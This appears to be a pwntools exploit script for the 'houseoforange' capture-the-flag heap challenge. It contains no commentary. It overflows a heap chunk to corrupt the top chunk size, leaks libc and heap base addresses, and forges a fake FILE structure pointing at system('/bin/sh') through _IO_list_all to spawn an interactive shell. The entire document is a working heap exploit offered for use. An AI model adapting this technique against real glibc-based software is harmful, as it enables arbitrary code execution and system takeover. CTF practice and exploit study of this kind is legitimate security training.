#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./houseoforange"

unsorted_bin_off = 0x3c4b78
system_off = 0x45390
io_list_off = 0x3c5520

p = process(elf)

def build(size, s):
    p.recvuntil("Your choice : ")
    p.sendline("1")
    p.recvuntil("Length of name :")
    p.sendline(str(size))
    p.recvuntil("Name :")
    p.send(s)
    p.recvuntil("Price of Orange:")
    p.sendline("3")
    p.recvuntil("Color of Orange:")
    p.sendline("3")

def see():
    p.recvuntil("Your choice : ")
    p.sendline("2")

def upgrade(s):
    p.recvuntil("Your choice : ")
    p.sendline("3")
    p.recvuntil("Length of name :")
    p.sendline(str(len(s)))
    p.recvuntil("Name:")
    p.send(s)
    p.recvuntil("Price of Orange:")
    p.sendline("1")
    p.recvuntil("Color of Orange:")
    p.sendline("3")


build(0x1b0, p8(0)*0x1b0)

payload = p8(0)*(0x1b8+0x20)
payload += p64(0xe01)
upgrade(payload)

build(0xef0, p8(0)*0xef0)

build(0x3f0, "A"*0x8)
gdb.attach(p)

see()

p.recvuntil("A"*0x8)
libc_base = u64(p.recv(6).ljust(8, "\x00"))-0x3c5178 
log.info("libc_base: "+hex(libc_base))

io_list_all = libc_base+io_list_off
system_addr = libc_base+system_off
unsorted_bin_addr = libc_base+unsorted_bin_off

upgrade("A"*0x10)

see()

p.recvuntil("A"*0x10)
heap_base = u64(p.recv(6).strip().ljust(8, "\x00"))-0x260
log.info("heap_base: "+hex(heap_base))

payload = p8(0)*0x410
payload += "/bin/sh\x00"
payload += p64(0x61)
payload += p64(unsorted_bin_addr)    
payload += p64(io_list_all-0x10)
payload += p64(2)
payload += p64(3)
payload += p8(0)*0x48
payload += p64(system_addr)
payload += p8(0)*0x58
payload += p64(heap_base+0x6e0)
upgrade(payload)

p.sendline("1")

p.interactive()
